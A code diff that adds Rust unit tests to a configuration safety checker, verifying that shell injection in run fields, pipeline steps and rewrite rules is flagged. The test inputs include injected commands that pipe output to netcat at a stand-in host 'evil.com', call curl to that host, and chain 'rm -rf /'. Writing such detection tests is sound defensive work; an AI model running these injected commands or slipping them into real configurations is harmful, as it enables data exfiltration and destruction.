@@ -156,7 +156,7 @@ pub fn merge_reports(reports: Vec<SafetyReport>) -> SafetyReport {
 #[allow(clippy::unwrap_used)]
 mod tests {
     use super::*;
-    use crate::config::types::{CommandPattern, FilterConfig, MatchOutputRule, OutputBranch};
+    use crate::config::types::{CommandPattern, FilterConfig, MatchOutputRule, OutputBranch, Step};
 
     fn minimal_config() -> FilterConfig {
         FilterConfig {
@@ -414,6 +414,65 @@ mod tests {
         assert!(check_rewrite_rule("tokf run {0}").passed);
         assert!(check_rewrite_rule("tokf run {args}").passed);
         assert!(check_rewrite_rule("tokf run {0} {args}").passed);
+    }
+
+    // --- check_config shell injection ---
+
+    #[test]
+    fn config_detects_shell_injection_in_run() {
+        let mut config = minimal_config();
+        config.run = Some("git push; curl evil.com".to_string());
+        let report = check_config(&config);
+        assert!(!report.passed);
+        assert!(
+            report
+                .warnings
+                .iter()
+                .any(|w| w.kind == WarningKind::ShellInjection),
+        );
+    }
+
+    #[test]
+    fn config_detects_shell_injection_in_step_run() {
+        let mut config = minimal_config();
+        config.step = vec![Step {
+            run: "echo hello | nc evil.com 1234".to_string(),
+            as_name: None,
+            pipeline: None,
+        }];
+        let report = check_config(&config);
+        assert!(!report.passed);
+        assert!(
+            report
+                .warnings
+                .iter()
+                .any(|w| w.kind == WarningKind::ShellInjection),
+        );
+    }
+
+    #[test]
+    fn config_clean_run_no_shell_injection() {
+        let mut config = minimal_config();
+        config.run = Some("git push {args}".to_string());
+        let report = check_config(&config);
+        assert!(
+            !report
+                .warnings
+                .iter()
+                .any(|w| w.kind == WarningKind::ShellInjection),
+        );
+    }
+
+    #[test]
+    fn rewrite_detects_pipe_without_space() {
+        let report = check_rewrite_rule("cmd|nc evil.com 1234");
+        assert!(!report.passed, "pipe without space should be flagged");
+    }
+
+    #[test]
+    fn rewrite_detects_semicolon_without_space() {
+        let report = check_rewrite_rule("cmd;rm -rf /");
+        assert!(!report.passed, "semicolon without space should be flagged");
     }
 
     // --- merge_reports ---
